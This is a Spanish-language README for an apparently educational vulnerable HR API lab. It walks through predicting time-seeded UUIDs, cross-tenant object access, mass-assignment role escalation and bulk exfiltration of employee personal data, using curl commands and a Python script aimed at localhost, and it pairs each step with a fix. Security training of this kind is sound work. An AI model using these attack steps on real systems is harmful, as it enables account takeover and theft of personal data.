# AxionHR — Lab Vulnerable

> **Lab educativo** de seguridad en APIs  
> Creado por **Elisa Elias** — [@Cinn4mor0ll](https://youtube.com/@Cinn4mor0ll)

---

## Descripción

AxionHR es una plataforma ficticia de Recursos Humanos B2B multi-tenant diseñada para demostrar una cadena de ataque real contra APIs modernas.

El lab demuestra cómo un atacante externo, partiendo de cero y sin credenciales previas, puede comprometer completamente una plataforma y exfiltrar datos sensibles de todos sus usuarios.

---

## Vulnerabilidades demostradas

| # | Vulnerabilidad | OWASP | CWE | Impacto |
|---|---------------|-------|-----|---------|
| 1 | UUID4 con PRNG débil | — | CWE-338 | IDs predecibles y enumerables |
| 2 | BOLA — sin validación de tenant | API1:2023 | CWE-639 | CURP, NSS, salario, CLABE expuestos |
| 3 | Mass Assignment — sin whitelist | API6:2023 | CWE-915 | Escalada de rol a hr_admin |
| 4 | Exfiltración masiva post-escalada | API1:2023 | CWE-639 | Todos los empleados del tenant víctima |

---

## Cadena de ataque

```
[1] Reconocimiento
    Swagger expuesto → endpoints documentados → registro público disponible
         ↓
[2] Registro legítimo
    Cuenta creada sin credenciales previas → JWT emitido → empleado_id asignado
         ↓
[3] UUID Prediction
    empleado_id generado con random.seed(time.time())
    Seed = timestamp en segundos → espacio de búsqueda colapsa de 2^122 a ~300
    Script reproduce el UUID en menos de 1 segundo
         ↓
[4] Enumeración de víctimas
    Script genera candidatos UUID en ventana de tiempo conocida
    Prueba cada candidato contra la API → encuentra empleados de otro tenant
         ↓
[5] BOLA
    Token propio → acceso a expedientes de otro tenant
    CURP, NSS, RFC, salario, CLABE expuestos
         ↓
[6] Mass Assignment
    PATCH acepta campos sin whitelist
    rol=hr_admin + tenant_id=victima → escalada sin autorización
         ↓
[7] Exfiltración masiva
    Nuevo login con rol actualizado
    GET /tenant/{id}/empleados → todos los empleados con datos completos
```

---

## Casos reales relacionados

| CVE | Sistema | Año | Descripción |
|-----|---------|-----|-------------|
| CVE-2026-41505 | RELATE (Python) | 2026 | Tokens generados con inputs predecibles como timestamps — mismo patrón |
| CVE-2026-40975 | Spring Boot | 2026 | `java.util.Random` para generar secretos — output recuperable |
| CVE-2025-66630 | Fiber (Go) | 2025 | UUID predecibles en sesiones, CSRF y rate limiting |
| CVE-2024-29868 | Apache StreamPipes | 2024 | PRNG débil en tokens de reset → account takeover |
| CVE-2021-3538 | Satori UUID (Go) | 2021 | PRNG débil → predicción de UUIDs → forja de tokens |

---

## Inicializar el lab

### Opción A — Manual

```bash
cd axionhr-lab/backend
pip install -r requirements.txt
python app.py
```

Abrir `frontend/index.html` en el browser.

- API + Swagger: `http://localhost:5000/docs/`

### Opción B — Docker

```bash
cd axionhr-lab
docker-compose up
```

- Frontend: `http://localhost:8080`
- API + Swagger: `http://localhost:5000/docs/`

---

## Demo manual paso a paso

### Fase 0 — Reconocimiento

```bash
# Ver endpoints documentados
curl -s http://localhost:5000/apispec.json | python3 -m json.tool
```

### Fase 1 — Registro

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/registro \
  -H "Content-Type: application/json" \
  -d '{
    "nombre": "Ana Torres Reyes",
    "email": "ana@atacante.com",
    "password": "Att4cker2026!",
    "tenant_code": "CME801215AB1",
    "curp": "TORA990812MDFRRN01",
    "nss": "99911122233"
  }'

export TOKEN="JWT_DE_LA_RESPUESTA"
export MI_UUID="empleado_id_DE_LA_RESPUESTA"
```

### Fase 2 — UUID Prediction

```bash
python3 -c "
import random, uuid, time

mi_uuid = 'TU_UUID_AQUI'
ahora = int(time.time())

for seed in range(ahora - 60, ahora + 5):
    random.seed(seed)
    candidato = str(uuid.UUID(int=random.getrandbits(128), version=4))
    if candidato == mi_uuid:
        print(f'[ENCONTRADO] Seed: {seed}')
        print(f'UUID reproducido: {candidato}')
        break
"
```

### Fase 3 — Enumeración de víctimas

```bash
# Editar enumerar.py con tu TOKEN y ejecutar
python3 enumerar.py
```

### Fase 4 — BOLA

```bash
# Acceder a expediente de empleado de otro tenant
curl -s http://localhost:5000/api/v1/empleados/UUID_VICTIMA/expediente \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### Fase 5 — Mass Assignment

```bash
curl -s -X PATCH http://localhost:5000/api/v1/empleados/$MI_UUID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "puesto": "Senior Consultant",
    "rol": "hr_admin",
    "tenant_id": "tenant-vertex-002"
  }' | python3 -m json.tool
```

### Fase 6 — Exfiltración masiva

```bash
# Nuevo login para JWT con rol actualizado
curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ana@atacante.com","password":"Att4cker2026!"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])"

export TOKEN2="NUEVO_JWT"

curl -s http://localhost:5000/api/v1/tenant/tenant-vertex-002/empleados \
  -H "Authorization: Bearer $TOKEN2" | python3 -m json.tool
```

---

## Fixes

### UUID seguro

```python
# Vulnerable
import random, uuid, time
random.seed(int(time.time()))
str(uuid.UUID(int=random.getrandbits(128), version=4))

# Fix: uuid4() usa os.urandom() internamente
import uuid
str(uuid.uuid4())
```

### BOLA

```python
# Agregar en cada endpoint que accede a un recurso por ID
if emp['tenant_id'] != user['tenant_id']:
    return jsonify({'error': 'Acceso no autorizado'}), 403
```

### Mass Assignment

```python
# Whitelist explícita de campos permitidos
CAMPOS_PERMITIDOS = ['puesto', 'departamento']
data = {k: v for k, v in request.get_json().items()
        if k in CAMPOS_PERMITIDOS}
```

---

## Mappings

```
OWASP API Security  →  API1:2023 BOLA
                        API3:2023 Excessive Data Exposure
                        API6:2023 Mass Assignment
CWE                 →  CWE-338 Weak PRNG
                        CWE-639 BOLA
                        CWE-915 Mass Assignment
MITRE ATT&CK        →  T1078 Valid Accounts
                        T1087 Account Discovery
                        T1213 Data from Information Repositories
                        T1565 Data Manipulation
Regulatorio MX      →  LFPDPPP — Datos personales sensibles
```

---

## Estructura del proyecto

```
axionhr-lab/
├── backend/
│   ├── app.py              # API Flask vulnerable
│   ├── requirements.txt
│   └── Dockerfile
├── frontend/
│   └── index.html          # Dashboard SaaS
├── docker-compose.yml
└── README.md
```

---

## Disclaimer

Este lab fue creado con fines **estrictamente educativos**.  
Toda la infraestructura es ficticia. No usar contra sistemas reales.  
El uso indebido de estas técnicas puede tener consecuencias legales.

---

*Creado por **Elisa Elias** — Cinn4mor0ll*  
*Canal: [YouTube](https://www.youtube.com/@Elisa_Elias)
